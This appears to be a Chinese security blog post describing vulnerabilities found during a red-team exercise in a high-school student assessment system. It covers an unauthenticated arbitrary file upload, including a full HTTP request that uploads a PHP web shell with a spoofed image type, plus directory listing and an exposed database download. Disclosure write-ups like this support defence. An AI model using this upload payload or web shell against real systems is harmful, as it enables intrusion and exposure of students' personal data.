{"title":"高中学生综合素质评价系统脆弱性","slug":"网安大类/Vulnerable/Web/Other/高中学生综合素质评价系统脆弱性","date":"2019-09-17T05:36:30.000Z","updated":"2023-01-31T02:29:10.673Z","url":"2019/9-17-420.html","path":"api/articles/2019/9-17-420.html.json","covers":["https://img.weiyigeek.top/2019/1/20190918160750.png","https://img.weiyigeek.top/2019/1/20190918161040.png"],"content":"<p><b style=\"color:red\">注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。</b></p>\n<a id=\"more\"></a>\n<h4 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a>0x00 前言</h4><p>描述:在护网行动中遇到的一些教育行业系统漏洞总结;该系统大多在学校内网里面基本不向外界所以一般对于其很少爆出漏洞;</p>\n<p><br></p>\n<h4 id=\"0x01-漏洞详细\"><a href=\"#0x01-漏洞详细\" class=\"headerlink\" title=\"0x01 漏洞详细\"></a>0x01 漏洞详细</h4><h5 id=\"1-任意文件上传\"><a href=\"#1-任意文件上传\" class=\"headerlink\" title=\"(1) 任意文件上传\"></a>(1) 任意文件上传</h5><p>描述:在登录xxx市高中学生综合素质评价系统之后在个人资料处有一个上传头像,测试发现存在任意上传并成功利用取得shell;<br>通过对代码的分析发现并没有验证任何权限 <code>/Website/MultiuploadFiles.php</code> (采用zend加密但是可以解密)<br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190918160750.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>直接未登录访问:<code>http://xxoo:8080/MultiuploadFiles.php / uploadimg.php</code>,然后上传一个图片用burp截包代码验证了 <code>Content-Type</code><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#POST请求</span></span><br><span class=\"line\">POST /MultiuploadFiles.php?action=act HTTP/1.1</span><br><span class=\"line\">Host: *.*.*.*:8080</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">DNT: 1</span><br><span class=\"line\">Referer: http://*.*.*.*:8080/MultiuploadFiles.php</span><br><span class=\"line\">Cookie: PHPSESSID=q7f4cjpdtpg97e9mn9diqi4p05</span><br><span class=\"line\">X-Forward-For: 127.0.0.1<span class=\"string\">'</span></span><br><span class=\"line\"><span class=\"string\">Connection: keep-alive</span></span><br><span class=\"line\"><span class=\"string\">Content-Type: multipart/form-data; boundary=---------------------------64873175618108</span></span><br><span class=\"line\"><span class=\"string\">Content-Length: 818</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">-----------------------------64873175618108</span></span><br><span class=\"line\"><span class=\"string\">Content-Disposition: form-data; name=\"afile\"; filename=\"test.php\"</span></span><br><span class=\"line\"><span class=\"string\">Content-Type: image/jpeg</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&lt;?php echo(2333334-1);eval($_POST[0]);?&gt;</span></span><br><span class=\"line\"><span class=\"string\">-----------------------------64873175618108</span></span><br><span class=\"line\"><span class=\"string\">Content-Disposition: form-data; name=\"button\"</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">æäº¤</span></span><br><span class=\"line\"><span class=\"string\">-----------------------------64873175618108--</span></span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<h4 id=\"目录遍历\"><a href=\"#目录遍历\" class=\"headerlink\" title=\"目录遍历\"></a>目录遍历</h4><p>描述: 目录遍历导致的照片泄漏的问题 <code>http://xxoo.com/upload/</code>;<br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190918161040.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p><br></p>\n<h4 id=\"数据库下载\"><a href=\"#数据库下载\" class=\"headerlink\" title=\"数据库下载\"></a>数据库下载</h4><p>描述:<a href=\"http://xxoo.com/database/data.zip\" target=\"_blank\" rel=\"noopener\">http://xxoo.com/database/data.zip</a></p>\n","comments":true,"excerpt":"注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。","categories":[{"name":"漏洞分析","path":"api/categories/漏洞分析.json"}],"tags":[{"name":"教育行业系统","path":"api/tags/教育行业系统.json"}]}